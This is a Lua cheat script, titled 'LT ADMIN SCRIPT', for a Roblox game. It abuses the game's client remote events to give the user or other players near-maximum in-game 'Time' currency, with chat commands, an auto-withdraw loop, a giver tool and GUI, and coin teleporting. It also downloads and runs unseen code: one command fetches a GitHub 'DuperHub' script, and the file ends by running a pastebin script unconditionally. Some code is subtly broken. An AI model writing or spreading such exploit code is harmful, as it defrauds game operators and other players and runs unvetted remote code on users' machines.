local prefix = "/"

local whitelist = {"7kstars", "User 2", "User 3", game.Players.LocalPlayer.Name} 



local localPlayer = game.Players.LocalPlayer

game.StarterGui:SetCore("SendNotification", {
Title = "LT ADMIN SCRIPT"; -- the title 
Text = "Admin script has been loaded say "..prefix.."cmds or "..prefix.."commands for a list of commands in console"; -- what the text says 
Duration = 15; -- how long the notification should in seconds
})

-- Helper function to get the distance between two Vector3 points
local function giveMaxTime(playerName)
    local playerList = {}
    if playerName == "random" then
        for _, p in ipairs(game.Players:GetPlayers()) do
            local timeStat = p.leaderstats.Time
            if timeStat.Value < 9223372036854775000 then
                table.insert(playerList, p)
            end
        end
        if #playerList > 0 then
            playerName = playerList[math.random(#playerList)].Name
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Error",
                Text = "All players already have max time"
            })
        wait(0.2)
        local args = {
                    [1] = "Error | All players already have max time.";
                    [2] = "All";
                }
                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
            return
        end
    elseif playerName == "lowest" then
        local minTime = math.huge
        for _, p in ipairs(game.Players:GetPlayers()) do
            local timeStat = p.leaderstats.Time
            if timeStat.Value < 9223372036854775000 and timeStat.Value < minTime then
                minTime = timeStat.Value
            end
        end
        for _, p in ipairs(game.Players:GetPlayers()) do
            local timeStat = p.leaderstats.Time
            if timeStat.Value == minTime then
                table.insert(playerList, p)
            end
        end
        if #playerList == 0 then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Error",
                Text = "All players already have max time"
            })
        wait(0.2)
        local args = {
                    [1] = "Error | All players already have max time.";
                    [2] = "All";
                }
                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
            return
        end
        playerName = playerList[math.random(#playerList)].Name
            elseif playerName == "all" then
        for _, p in ipairs(game.Players:GetPlayers()) do
            local timeStat = p.leaderstats.Time
            if timeStat.Value < 9223372036854775000 then
                local timeToAdd = 9223372036854775000 - timeStat.Value
                local args = {
                    [1] = p,
                    [2] = timeToAdd
                }
                game.ReplicatedStorage.SentMoney:FireServer(unpack(args))
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Giving max time to players",
            Text = [[if not already make sure you have auto max on by saying "]]..prefix..[[automax"]]
        })
        return
    elseif playerName == "closest" then
        local minDist = math.huge
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p ~= game.Players.LocalPlayer then
                local dist = (p.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude
                if dist < minDist then
                    minDist = dist
                end
            end
        end
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p ~= game.Players.LocalPlayer then
                local dist = (p.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude
                if dist == minDist then
                    table.insert(playerList, p)
                end
            end
        end
        if #playerList == 0 then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Error",
                Text = "No other players found"
            })
        return
        end
        playerName = playerList[math.random(#playerList)].Name
    elseif playerName == "farthest" then
        local maxDist = 0
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p ~= game.Players.LocalPlayer then
                local dist = (p.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude
                if dist > maxDist then
                    maxDist = dist
                end
            end
        end
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p ~= game.Players.LocalPlayer then
                local dist = (p.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude
                if dist == maxDist then
                    table.insert(playerList, p)
                end
            end
        end
        if #playerList == 0 then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Error",
                Text = "No other players found."
            })
            return
        end
        playerName = playerList[math.random(#playerList)].Name
    elseif playerName ~= "random" then
        -- Check if playerName is a valid substring of a player's name
        for _, p in ipairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(playerName)) then
                table.insert(playerList, p)
            end
        end
        if #playerList == 0 then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Error",
                Text = "No matching players found"
            })
        wait(0.2) 
        local args = {
                    [1] = "Error | No matching players found.";
                    [2] = "All";
                }
                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
            return
        end
        playerName = playerList[1].Name -- Take the first player with matching name
    end
    local player = game.Players:FindFirstChild(playerName)
    local timeStat = player.leaderstats.Time
    local maxTime = 9223372036854775000

        if timeStat.Value >= maxTime then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Error",
            Text = player.Name .. " already has max time"
        })
    local args = {
                    [1] = "Error | "..player.Name .." already has max time.";
                    [2] = "All";
                }
                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
        return
    end
   
    local timeToAdd = maxTime - timeStat.Value
    local args = {
        [1] = player,
        [2] = timeToAdd
    }
    game.ReplicatedStorage.SentMoney:FireServer(unpack(args))
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success",
        Text = "Max time has been given to " .. player.Name
    })
wait(0.2)
local args = {
 [1] = "Success | Max time has been given to ".. player.Name;
 [2] = "All";
  }
 game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
end

for _, player in pairs(game.Players:GetPlayers()) do
    player.Chatted:Connect(function(msg)
        if table.find(whitelist, player.Name) and (msg == ""..prefix.."max" or string.sub(msg, 1, 5) == ""..prefix.."max ") then
            local playerName = player.Name
            if string.sub(msg, 1, 5) == ""..prefix.."max " then
                playerName = string.sub(msg, 6)
            end
            giveMaxTime(playerName)
        end
    end)
end

game.Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        if table.find(whitelist, player.Name) and (msg == ""..prefix.."max" or string.sub(msg, 1, 5) == ""..prefix.."max ") then
            local playerName = player.Name
            if string.sub(msg, 1, 5) == ""..prefix"max " then
                playerName = string.sub(msg, 6)
            end
            giveMaxTime(playerName)
        end
    end)
end)

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."max" then
        local MAX_TIME = 9223372036854775000

-- check if u have max time
local function hasMaxTime(player)
    return player.leaderstats.Time.Value >= MAX_TIME
end

-- check if u need time
local function withdrawMaxTime(player)
    if not hasMaxTime(player) then
        local timeToWithdraw = math.min(MAX_TIME - player.leaderstats.Time.Value, MAX_TIME)
        game.ReplicatedStorage.ATMRemoteEvent:FireServer(tostring(timeToWithdraw), "withdraw")
    end
end

withdrawMaxTime(game.Players.LocalPlayer)
    end
end)

--max tool 
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."maxtool" then
        local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Max Time Giver"

-- check for player
local function isPlayerCharacter(part)
    if not part then return false end
    local humanoid = part.Parent:FindFirstChildOfClass("Humanoid")
    if humanoid then
        return true
    end
    return false
end

-- clicker detector shittt
tool.Equipped:Connect(function()
    tool.Activated:Connect(function()
        local character = tool.Parent
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local mouse = game.Players.LocalPlayer:GetMouse()
        local part = mouse.Target
        if isPlayerCharacter(part) then
            local player = game.Players:GetPlayerFromCharacter(part.Parent)
            local targetTime = 9223372036854775000 -- time u give
            if player and player.leaderstats.Time.Value < targetTime then
                game.ReplicatedStorage.SentMoney:FireServer(player, targetTime - player.leaderstats.Time.Value)
            end
        end
    end)
end)

-- add too backpack
tool.Parent = game.Players.LocalPlayer.Backpack

wait(0.1)
game.StarterGui:SetCore("SendNotification", {
Title = "Success"; -- the title 
Text = "Max tool has been given"; -- what the text says 
Duration = 5; -- how long the notification should in seconds
})
    end
end)


-- give time to all
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."max all" then
local givetime = 9223372036854775000


local function reachmax()
    for _, player in pairs(game.Players:GetPlayers()) do
        if player.leaderstats.Time.Value < givetime then
            return false
        end
    end
    return true
end

local function giveMoney()
    while not reachmax() do
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.leaderstats.Time.Value < givetime then
                game.ReplicatedStorage.SentMoney:FireServer(player, givetime - player.leaderstats.Time.Value)
                wait(1.5)
            end
        end
        wait()
    end
end


giveMoney()
    end
end)

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."autotime" then
        game.StarterGui:SetCore("SendNotification", {
Title = "Success"; -- the title 
Text = "Autotime has been enabled (dont use more than once)"; -- what the text says 
Duration = 5; -- how long the notification should in seconds
})
        end
        end)

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."autotime" then
local MAX_TIME = 9223372036854775000

-- check if u have max time
local function hasMaxTime(player)
    return player.leaderstats.Time.Value >= MAX_TIME
end

-- check if u need time
local function withdrawMaxTime(player)
    if not hasMaxTime(player) then
        local timeToWithdraw = math.min(MAX_TIME - player.leaderstats.Time.Value, MAX_TIME)
        game.ReplicatedStorage.ATMRemoteEvent:FireServer(tostring(timeToWithdraw), "withdraw")
    end
end

getgenv().oltimer = true
while oltimer do
    withdrawMaxTime(game.Players.LocalPlayer)
    wait(0.6) -- how long u wait 
end

    end
end)

-- turn off autotime
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."unautotime" then
    getgenv().oltimer = false
while oltimer do
    withdrawMaxTime(game.Players.LocalPlayer)
    wait(0.6) -- how long u wait 
end
wait(0.1)
game.StarterGui:SetCore("SendNotification", {
Title = "Success"; -- the title 
Text = "Autotime has been disabled"; -- what the text says 
Duration = 5; -- how long the notification should in seconds
})
    end
    end)


-- gui command
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."maxgui" then
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function giveMaxTime(player)
    local playerTime = player.leaderstats.Time.Value
    if playerTime >= 9223372036854775000 then
        return -- player already has max time, do nothing
    end
    local args = {
        [1] = player,
        [2] = 9223372036854775000 - playerTime -- give the player the remaining time needed to reach max time
    }
    ReplicatedStorage.SentMoney:FireServer(unpack(args))
end

-- create the GUI
local gui = Instance.new("ScreenGui")
gui.Name = "MaxTimeGUI"
gui.Parent = game.CoreGui

local frame = Instance.new("Frame")
frame.BackgroundColor3 = Color3.new(9.5, 0, 0.5)
frame.Size = UDim2.new(0, 400, 0, 100)
frame.Position = UDim2.new(0, 0, 0.5, -50)
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local label = Instance.new("TextLabel")
label.BackgroundTransparency = 1
label.Position = UDim2.new(0.5, 0, 0.40, -20)
label.AnchorPoint = Vector2.new(0.5, 0.5)
label.Size = UDim2.new(0, 300, 0, 40)
label.Font = Enum.Font.ArialBold
label.Text = "Type a player's name:"
label.TextColor3 = Color3.new(1, 1, 1)
label.TextScaled = true
label.Parent = frame

local textbox = Instance.new("TextBox")
textbox.ClearTextOnFocus = true
textbox.Position = UDim2.new(0.5, 0, 0.9223372036854775000, -20)
textbox.AnchorPoint = Vector2.new(0.5, 0.5)
textbox.Size = UDim2.new(0, 300, 0, 40)
textbox.TextScaled = true
textbox.Parent = frame

textbox.FocusLost:Connect(function(enterPressed)
    if not enterPressed then
        return -- focus lost without enter key pressed, do nothing
    end
    local playerName = textbox.Text
    local players = game.Players:GetPlayers()
    local player
    for i = 1, #players do
        if players[i].Name:lower():find(playerName:lower()) or players[i].DisplayName:lower():find(playerName:lower()) then
            player = players[i]
            break
        end
    end
    if player then
        if player.leaderstats.Time.Value >= 9223372036854775000 then
            label.Text = player.DisplayName .. " already has max time."
        else
            giveMaxTime(player)
            label.Text = player.DisplayName .. " has been given max time."
        end
    else
        label.Text = "Player not found."
    end
    textbox.Text = ""
end)
wait(0.1)
game.StarterGui:SetCore("SendNotification", {
Title = "Success"; -- the title 
Text = "Gui has been loaded"; -- what the text says 
Duration = 5; -- how long the notification should in seconds
})
    end
end)

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."unmaxgui" then
        game:GetService("CoreGui").MaxTimeGUI:Destroy()
        wait(0.1)
        game.StarterGui:SetCore("SendNotification", {
Title = "Success"; -- the title 
Text = "MaxGUI has been deleted."; -- what the text says 
Duration = 5; -- how long the notification should in seconds
})
end
end)

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."duperhub" then
        game.StarterGui:SetCore("SendNotification", {
Title = "Success"; -- the title 
Text = "DuperHub has been loaded."; -- what the text says 
Duration = 5; -- how long the notification should in seconds
})
wait(0.2)
loadstring(game:HttpGet("https://raw.githubusercontent.com/echofluff/limited-time/main/DuperHub"))()
    end
end)


game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."hide" then
game.StarterGui:SetCore("SendNotification", {
Title = "Username hiden"; -- the title 
Text = "Rejoin to disable"; -- what the text says 
Duration = 5; -- how long the notification should in seconds
})
        wait(0.1)
        local player = game:GetService("Players").LocalPlayer
local char = player.Character

while wait() do
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BillboardGui") then
            v:Destroy()
        end
    end
end
    end
end)

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ""..prefix.."coins" then
        local coinFound = false
        local partName = "Coin" -- Change this to the name of the parts you want to teleport
        local player = game:GetService("Players").LocalPlayer
        local teleportLocation = player.Character.HumanoidRootPart.Position

        -- Find all parts in the workspace with the specified name
        local parts = game:GetService("Workspace"):GetDescendants()
        for _, part in ipairs(parts) do
            if part.Name == partName and part:IsA("BasePart") then
                -- Teleport the part to the player's location
                part.CFrame = CFrame.new(teleportLocation)
                coinFound = true
            end
        end

        if coinFound then
            -- Coins found, show success notification
            game.StarterGui:SetCore("SendNotification", {
                Title = "Success"; -- the title 
                Text = "Coins have been claimed"; -- what the text says 
                Duration = 5; -- how long the notification should in seconds
            })
            wait(0.2)
        else
            -- No coins found, show error notification
            game.StarterGui:SetCore("SendNotification", {
                Title = "Error"; -- the title 
                Text = "No coins found"; -- what the text says 
                Duration = 5; -- how long the notification should in seconds
            })
            wait(0.2)
        end
    end
end)

for _, player in pairs(game.Players:GetPlayers()) do
    if player ~= game.Players.LocalPlayer and table.find(whitelist, player.Name) then
        player.Chatted:Connect(function(msg)
            if msg == prefix.."commands" or msg == prefix.."cmds" then
                local args = {
                    [1] = "/w "..player.Name.." Commands: "..prefix.."max (Gives yourself max time), "..prefix.."max random (Gives random player max time)";
                    [2] = "All";
                }
                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
                wait(0.2)
                local args = {
                    [1] = "/w "..player.Name.." "..prefix.."max lowest (Gives lowest player with time max time), "..prefix.."max (Player) (Gives max time the player you choose)";
                    [2] = "All";
                }
                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
            end
        end)
    end
end

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == prefix.."commands" or msg == prefix.."cmds" then
        game.StarterGui:SetCore("SendNotification", {
Title = "Success"; -- the title 
Text = "Commands have been printed in console (say /console in chat)"; -- what the text says 
Duration = 5; -- how long the notification should in seconds
})
wait(0.2)
print([[
COMMANDS:
]]..prefix..[[max         withdraws max time for yourself  (Both localplayer and whitelisted)   
]]..prefix..[[max (player) gives a player max time  (Both localplayer and whitelisted)
]]..prefix..[[max random   gives a random player max time  (Both localplayer and whitelisted)  
]]..prefix..[[max lowest   gives time to the person with the lowest time in server  (Both localplayer and whitelisted)
]]..prefix..[[max all      (must use /autotime first) gives max time to everyone in server (not loop)  (localplayer only)
]]..prefix..[[max closest     gives max time to closest person to you    (Both localplayer and whitelisted)
]]..prefix..[[max farthest    gives max time to farthest person from you  (Both localplayer and whitelisted)
]]..prefix..[[autotime     auto gives you max time (use only once)  (localplayer only)
]]..prefix..[[unautotime   stops autotime  (localplayer only)
]]..prefix..[[maxgui       loads in max gui giver  (localplayer only)
]]..prefix..[[unmaxgui     deletes max gui  (localplayer only)
]]..prefix..[[maxtool      gives you tool that gives max time  (localplayer only)
]]..prefix..[[duperhub    loads in duperhub OwO  (localplayer only)
]]..prefix..[[coins        teleports that yellow thing that spawns in the map to you  (localplayer only)
]]..prefix..[[hide      Hides your usrname and time value (FE)  (localplayer only)]])
    end
end)

wait(0.1)

loadstring(game:HttpGet("https://pastebin.com/raw/sXZeZr7s"))()

